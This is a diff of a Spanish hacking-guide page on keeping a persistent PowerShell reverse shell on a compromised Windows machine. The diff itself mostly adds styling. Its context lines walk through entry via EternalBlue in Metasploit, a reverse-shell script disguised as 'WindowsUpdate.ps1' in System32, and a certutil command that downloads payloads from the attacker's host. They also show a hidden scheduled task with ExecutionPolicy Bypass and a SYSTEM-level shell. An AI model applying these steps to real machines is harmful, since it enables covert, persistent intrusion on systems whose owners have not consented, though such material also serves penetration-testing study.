@@ -1,6 +1,21 @@
-# Shell Persistente mediante PowerShell Windows
+---
+icon: window-flip
+layout:
+  title:
+    visible: true
+  description:
+    visible: false
+  tableOfContents:
+    visible: true
+  outline:
+    visible: true
+  pagination:
+    visible: true
+---
 
-### Intrusion a la maquina (Ejemplo)
+# Shell Persistente PowerShell
+
+### <mark style="color:purple;">Intrusion a la maquina (Ejemplo)</mark>
 
 Primero tendremos que comprometer una maquina `windows`, por ejemplo pongamos que es vulnerable al `Eternal Blue`, abriremos `metasploit`.
 
@@ -18,7 +33,7 @@ exploit
 
 Una vez que estemos dentro, programaremos los scripts en nuestra maquina atacante...
 
-### Scripts para persistencia mediante PowerShell
+### <mark style="color:purple;">Scripts para persistencia mediante PowerShell</mark>
 
 Codigo `WindowsUpdate.ps1` para hacernos la `reverse shell` desde windows:
 
@@ -89,7 +104,7 @@ while ($true) {
 }
 ```
 
-### Pasar scripts a la maquina victima mediante metasploit
+### <mark style="color:purple;">Pasar scripts a la maquina victima mediante metasploit</mark>
 
 Tendremos que pasar esos archivos a la maquina victima, en mi caso lo llevare a `C:\Windows\System32` para que se quede bien camuflado.
 
@@ -106,7 +121,7 @@ upload Update.ps1
 
 Despues ejecutaremos `shell`, para obtener la `shell` de `windows`.
 
-### Pasar scripts a la maquina victima mediante terminal
+### <mark style="color:purple;">Pasar scripts a la maquina victima mediante terminal</mark>
 
 Imaginemos que no estamos utilizando `metasploit` lo podremos hacer de esta otra forma...
 
@@ -126,7 +141,7 @@ certutil.exe -f -urlcache -split http://<IP>:8000/Update.ps1 Update.ps1
 
 Asi nos pasaremos los 2 archivos a la maquina victima.
 
-### Programar persistencia en la maquina victima
+### <mark style="color:purple;">Programar persistencia en la maquina victima</mark>
 
 Despues en la maquina `windows` que tenemos comprometida, ejecutaremos el siguiente comando:
 
@@ -170,7 +185,7 @@ powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Syst
 
 Una vez comprobado, ya podremos reiniciar el equipo, hacer lo que queramos, hacerle `Ctrl+C` a la `shell` y volver a estar a la escucha para otra vez recuperarla, ya tendremos `persistencia`.
 
-### Escucha mediante terminal
+### <mark style="color:purple;">Escucha mediante terminal</mark>
 
 Ahora podremos obtener la `shell` todas las veces que queramos por que se estara ejecutando cada 5 segundos, por lo que solo tendremos que poner el siguiente comando:
 
@@ -190,7 +205,7 @@ shell> whoami
 nt authority\system
 ```
 
-### Escucha mediante metasploit
+### <mark style="color:purple;">Escucha mediante metasploit</mark>
 
 Tambien lo podemos hacer mediante `metasploit`.
 
@@ -209,7 +224,7 @@ run
 
 Y con esto obtendremos una `shell` mediante `metasploit`.
 
-### Eliminar la tarea persistente y los scripts
+### <mark style="color:purple;">Eliminar la tarea persistente y los scripts</mark>
 
 Pondremos los siguientes comandos dentro de la maquina `windows`:
 
